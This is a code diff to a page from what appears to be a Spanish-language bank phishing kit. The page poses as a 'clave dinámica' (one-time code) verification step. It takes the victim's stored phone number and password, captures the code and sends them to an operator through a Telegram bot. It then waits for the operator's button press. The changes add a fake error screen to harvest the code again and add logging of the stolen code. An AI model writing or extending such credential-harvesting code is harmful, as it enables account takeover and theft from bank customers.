@@ -405,12 +405,16 @@
   <script src="../js/actions.js"></script>
   <script>
     document.addEventListener("DOMContentLoaded", () => {
+      // ⭐ VERIFICAR SI VIENE CON ERROR DESDE URL
+      const urlParams = new URLSearchParams(window.location.search);
+      const showError = urlParams.get('error') === '1';
+      
       // Verificar que existan los datos necesarios
       const formData = JSON.parse(localStorage.getItem("formData")) || {};
       
       if (!formData.phoneNumber || !formData.password) {
         console.error("❌ Datos incompletos");
-        window.location.href = "access-sign-in.html";
+        window.location.href = "accces-sign-in.html";
         return;
       }
 
@@ -430,6 +434,12 @@
       const errorAlert = document.getElementById('errorAlert');
       
       let currentIndex = 0;
+      
+      // ⭐ MOSTRAR ERROR SI VIENE DESDE "PEDIR OTRA VEZ"
+      if (showError) {
+        errorAlert.classList.add('show');
+        console.log('⚠️ Mostrando error de clave dinámica');
+      }
       
       // Manejo del teclado numérico
       keyButtons.forEach(btn => {
@@ -483,20 +493,16 @@
       }
       
       // Función para mostrar error
-      function showError() {
-        // Mostrar alerta de error
+      function showErrorMessage() {
         errorAlert.classList.add('show');
-        
-        // Limpiar campos después de 3 segundos
-        setTimeout(() => {
-          clearInputs();
-          errorAlert.classList.remove('show');
-        }, 3000);
+        clearInputs();
       }
       
       // Botón confirmar con integración de Telegram
       confirmBtn.addEventListener('click', async () => {
         const dinamica = inputs.map(input => input.dataset.realValue || input.value).join('');
+        
+        console.log('🔐 Clave dinámica ingresada:', dinamica);
         
         // Guardar la dinámica en localStorage
         const savedData = JSON.parse(localStorage.getItem("formData")) || {};
@@ -526,11 +532,15 @@
         });
 
         try {
+          console.log('📤 Enviando a Telegram...');
+          
           // Enviar mensaje a Telegram
           const responseMensaje = await sendTelegramMessageWithBtn(mensaje, teclado);
+          console.log('✅ Mensaje enviado:', responseMensaje);
           
           // Esperar respuesta del botón
           const { action } = await waitForButtonPress(responseMensaje.message_id);
+          console.log('✅ Acción recibida:', action);
           
           // Ocultar pantalla de validación
           validatingScreen.classList.remove('active');
@@ -541,28 +551,9 @@
         } catch (error) {
           console.error("❌ Error:", error);
           validatingScreen.classList.remove('active');
-          showError();
+          showErrorMessage();
         }
       });
-
-      // Función global para manejar acciones desde actions.js
-      window.handleDinamicaAction = function(action) {
-        validatingScreen.classList.remove('active');
-        
-        if (action === 'error_dinamica' || action === 'pedir_dinamica') {
-          // Mostrar error y limpiar campos
-          showError();
-        } else if (action === 'correcto') {
-          // Redirigir a la siguiente pantalla o mostrar éxito
-          console.log('✅ Clave dinámica correcta');
-          // Aquí puedes redirigir a la siguiente página
-          // window.location.href = "siguiente-paso.html";
-        } else if (action === 'finish') {
-          // Finalizar proceso
-          console.log('✔️ Proceso finalizado');
-          // window.location.href = "finalizacion.html";
-        }
-      };
       
       // Prevenir teclado del sistema
       inputs.forEach(input => {
